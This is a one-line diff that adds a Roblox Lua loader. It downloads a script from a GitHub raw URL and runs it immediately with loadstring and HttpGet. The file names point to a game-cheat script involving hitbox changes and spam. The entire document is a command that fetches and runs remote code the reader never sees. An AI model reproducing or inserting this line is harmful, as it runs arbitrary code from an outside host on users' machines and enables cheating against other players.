@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/hitbox-changes-azure-latch-spam3-wr30ts3cgwqvsj.lua"))()
